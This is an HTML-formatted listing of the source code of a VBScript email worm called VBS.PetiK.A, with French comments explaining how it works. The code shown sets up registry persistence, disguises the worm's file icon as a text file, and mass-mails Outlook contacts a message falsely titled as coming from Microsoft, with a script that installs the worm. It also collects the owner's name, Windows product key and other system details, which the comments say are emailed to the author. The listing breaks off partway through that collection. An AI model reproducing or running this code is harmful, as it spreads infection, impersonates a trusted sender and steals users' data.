<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>20010130 - VBS.PetiK.A</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF0000;
}
.sc3 {
	color: #0000FF;
}
.sc4 {
	color: #808080;
}
.sc6 {
}
.sc7 {
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">'Taille : 9766 octets
'Date : 30/01/2000
'Il se copie dans le dossier WINDIR sous le nom de PetiK.txt.vbs
'Pour cacher cela, il modifiera l'icône des .VBS en .TXT
'Il infecte ensuite mIRC. Il cherche le dossier par défaut où se trouve le fichier
'MIRC.INI. Si il le trouve, il crée à l'intérieur du dossier un fichier SCRIPT.INI
'Il infecte ensuite PIRCH de la même manière.
'Pour le logiciel Outlook, il va écrire son code à l'intérieur du message en VBScript
'De telle sorte que le virus s'active dès la lecture du message.
'Il envoie également différentes informations, à deux adresses : 
'petik@caramail.com et ppetik@hotmail.com. Les informations sont :
' - Nom de l'utilisateur et de l'Organisation
' - Le nom de l'ordinateur
' - Le pays
' - La version et le numéro de WINDOWS
' - Le numéro d'identification
' - Le numéro d'enregistrement
' - La page de démarrage d'Internet Explorer
' - Le dossier de téléchargement
' - Le nom de dossier de WINDOWS, SYSTEM, TEMPORAIRE et de PROGRAM FILES
' Et envoie tous cela avec comme sujet :
' Message pour PetiK de XXX où XXX est le nom d'Utilisateur
'Le message envoyé aux autres personnes est :
' " Important Message From Micrsoft Corporation "
'Il infecte ensuite les fichiers en fonction de leur extension.
' VBS et VBE : écrit le code du virus à l'intérieur.
' JS et JSE : écrit le code et change l'extension : file.js =&gt; file.vbs
' EXE, INI, GIF, JPG et HTM : créer un nouveau fichier .VBS avec code du virus
' MP3, DOC, XLS, PPT et HLP : met l'attribut caché
'
'VBS/Outlook/mIrc/PIRCH/PetiK.A par PetiK
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">fso</span><span class="sc6">,</span><span class="sc7">ws</span><span class="sc6">,</span><span class="sc7">file</span><span class="sc0">
</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">fso</span><span class="sc0">  </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">CreateObject</span><span class="sc6">(</span><span class="sc4">"Scripting.FileSystemObject"</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">ws</span><span class="sc0">   </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">CreateObject</span><span class="sc6">(</span><span class="sc4">"WScript.Shell"</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">file</span><span class="sc0">     </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">fso.OpenTextFile</span><span class="sc6">(</span><span class="sc7">WScript.ScriptFullName</span><span class="sc6">,</span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">vbscopie</span><span class="sc0">     </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">file.ReadAll</span><span class="sc0">

</span><span class="sc7">DEBUT</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">DEBUT</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">win</span><span class="sc0">  </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">fso.GetspecialFolder</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">RUN</span><span class="sc0">      </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc4">"HKLM\Software\Microsoft\Windows\CurrentVersion\Run\PetiK"</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">c</span><span class="sc0">    </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">fso.GetFile</span><span class="sc6">(</span><span class="sc7">WScript.ScriptFullName</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">PetiK</span><span class="sc0">        </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">win&amp;</span><span class="sc4">"\PetiK.txt.vbs"</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">c.Copy</span><span class="sc0">   </span><span class="sc6">(</span><span class="sc7">PetiK</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">ws.RegWrite</span><span class="sc0"> </span><span class="sc7">RUN</span><span class="sc6">,</span><span class="sc7">PetiK</span><span class="sc0">
</span><span class="sc7">VBSI</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">ws.RegRead</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc4">"HKCR\VBSFile\DefaultIcon\"</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">TXTI</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">ws.RegRead</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc4">"HKCR\txtfile\DefaultIcon\"</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">ws.RegWrite</span><span class="sc0"> </span><span class="sc4">"HKLM\Software\PetiK\ICONE VBS"</span><span class="sc6">,</span><span class="sc7">VBSI</span><span class="sc0">
</span><span class="sc7">ws.RegWrite</span><span class="sc0"> </span><span class="sc4">"HKCR\VBSFile\DefaultIcon\"</span><span class="sc6">,</span><span class="sc7">TXTI</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">ws.RegRead</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc4">"HKLM\Software\PetiK\"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">"OK"</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc7">EMail</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">ws.RegRead</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc4">"HKLM\Software\PetiK\MIRC"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">"OK"</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
</span><span class="sc7">Mirc</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">ws.RegRead</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc4">"HKLM\Software\PetiK\PIRCH"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">"OK"</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
</span><span class="sc7">Pirch</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc7">lecteur</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

</span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">EMail</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">fso</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">CreateObject</span><span class="sc6">(</span><span class="sc4">"scripting.filesystemobject"</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">Outlook</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">CreateObject</span><span class="sc6">(</span><span class="sc4">"Outlook.Application"</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Outlook</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Outlook"</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">Myself</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">fso.opentextfile</span><span class="sc6">(</span><span class="sc7">wscript.scriptfullname</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">I</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc3">Do</span><span class="sc0"> </span><span class="sc3">While</span><span class="sc0"> </span><span class="sc7">Myself.atendofstream</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0">
</span><span class="sc7">MyLine</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Myself.readline</span><span class="sc0">
</span><span class="sc7">Code</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Code</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc2">34</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">" &amp; vbcrlf &amp; "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc2">34</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Replace</span><span class="sc6">(</span><span class="sc7">MyLine</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc2">34</span><span class="sc6">),</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc2">34</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"&amp;chr(34)&amp;"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc2">34</span><span class="sc6">))</span><span class="sc0">
</span><span class="sc3">Loop</span><span class="sc0">
</span><span class="sc7">Myself.Close</span><span class="sc0">
</span><span class="sc7">htm</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"&lt;HTML&gt;&lt;HEAD&gt;&lt;META content="</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc2">34</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">" &amp; chr(34) &amp; "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc2">34</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"text/html; charset=iso-8859-1"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc2">34</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">" http-equiv=Content-Type&gt;&lt;META content="</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc2">34</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"MSHTML 5.00.2314.1000"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc2">34</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">" name=GENERATOR&gt;&lt;STYLE&gt;&lt;/STYLE&gt;&lt;/HEAD&gt;&lt;BODY bgColor=#ffffff&gt;&lt;SCRIPT language=vbscript&gt;"</span><span class="sc0">
</span><span class="sc7">htm</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">htm</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"On Error Resume Next"</span><span class="sc0">
</span><span class="sc7">htm</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">htm</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"Set fso = CreateObject("</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc2">34</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"Scripting.FileSystemObject"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc2">34</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">")"</span><span class="sc0">
</span><span class="sc7">htm</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">htm</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"If Err.Number &lt;&gt; 0 Then"</span><span class="sc0">
</span><span class="sc7">htm</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">htm</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"document.write "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc2">34</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"&lt;font face='verdana' color=#ff0000 size='2'&gt;You need ActiveX enabled if you want to see this EMail.&lt;br&gt;Please open this message again and click accept ActiveX&lt;br&gt;Microsoft Outlook&lt;/font&gt;"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc2">34</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0">
</span><span class="sc7">htm</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">htm</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"Else"</span><span class="sc0">
</span><span class="sc7">htm</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">htm</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"Set vbs = fso.CreateTextFile(fso.GetSpecialFolder(1) &amp; "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc2">34</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\Worm.vbs"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc2">34</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">", True)"</span><span class="sc0">
</span><span class="sc7">htm</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">htm</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"vbs.write  "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc2">34</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Code</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc2">34</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">htm</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">htm</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"vbs.Close"</span><span class="sc0">
</span><span class="sc7">htm</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">htm</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"Set ws = CreateObject("</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc2">34</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"wscript.shell"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc2">34</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">")"</span><span class="sc0">
</span><span class="sc7">htm</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">htm</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"ws.run fso.GetSpecialFolder(0) &amp; "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc2">34</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\wscript.exe "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc2">34</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">" &amp; fso.getspecialfolder(1) &amp; "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc2">34</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\Worm.vbs %"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc2">34</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0">
</span><span class="sc7">htm2</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">htm2</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"document.write "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc2">34</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"This message has permanent errors.&lt;br&gt;Sorry&lt;br&gt;"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc2">34</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0">
</span><span class="sc7">htm2</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">htm2</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"End If"</span><span class="sc0">
</span><span class="sc7">htm2</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">htm2</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"&lt;"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"/SCRIPT&gt;&lt;/"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"body&gt;&lt;/"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"html&gt;"</span><span class="sc0">
</span><span class="sc7">HtmlBody</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">htm</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">htm2</span><span class="sc0">
</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">mapi</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Outlook.GetNameSpace</span><span class="sc6">(</span><span class="sc4">"MAPI"</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc3">Each</span><span class="sc0"> </span><span class="sc7">Addresslist</span><span class="sc0"> </span><span class="sc3">In</span><span class="sc0"> </span><span class="sc7">mapi.AddressLists</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Addresslist.AddressEntries.Count</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc7">AddCount</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Addresslist.AddressEntries.Count</span><span class="sc0">
</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">Msg</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Outlook.CreateItem</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">Msg.Subject</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Important Message From Microsoft Corporation"</span><span class="sc0">
</span><span class="sc7">Msg.HtmlBody</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">HtmlBody</span><span class="sc0">
</span><span class="sc7">Msg.DeleteAfterSubmit</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0">
</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">II</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc7">AddCount</span><span class="sc0">
</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">Addentry</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Addresslist.AddressEntries</span><span class="sc6">(</span><span class="sc7">II</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">AddCount</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc7">Msg.BCC</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Addentry.Address</span><span class="sc0">
</span><span class="sc3">Else</span><span class="sc0">
</span><span class="sc7">Msg.BCC</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Msg.BCC</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"; "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Addentry.Address</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc7">Msg.send</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">msg2</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Outlook.CreateItem</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">ComputerName</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">CreateObject</span><span class="sc6">(</span><span class="sc4">"WScript.NetWork"</span><span class="sc6">).</span><span class="sc7">ComputerName</span><span class="sc0">
</span><span class="sc7">NOM</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">ws.RegRead</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc4">"HKLM\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner"</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">ENT</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">ws.RegRead</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc4">"HKLM\Software\Microsoft\Windows\CurrentVersion\RegisteredOrganization"</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">VER</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">ws.RegRead</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc4">"HKLM\Software\Microsoft\Windows\CurrentVersion\Version"</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">NUM</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">ws.RegRead</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc4">"HKLM\Software\Microsoft\Windows\CurrentVersion\VersionNumber"</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">REC1</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">ws.RegRead</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc4">"HKLM\Software\Microsoft\Windows\CurrentVersion\ProductId"</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">REC2</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">ws.RegRead</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc4">"HKLM\Software\Microsoft\Windows\CurrentVersion\ProductKey"</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">PFD</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">ws.RegRead</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc4">"HKLM\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir"</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">PDEM</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">ws.RegRead</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc4">"HKCU\Software\Microsoft\Internet Explorer\Main\Start Page"</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">DDIR</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">ws.RegRead</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc4">"HKCU\Software\Microsoft\Internet Explorer\Download Directory"</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">PAYS</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">ws.RegRead</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc4">"HKCU\Software\Microsoft\Internet Explorer\International\AcceptLanguage"</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">WINDIR</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">fso.GetSpecialFolder</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0">
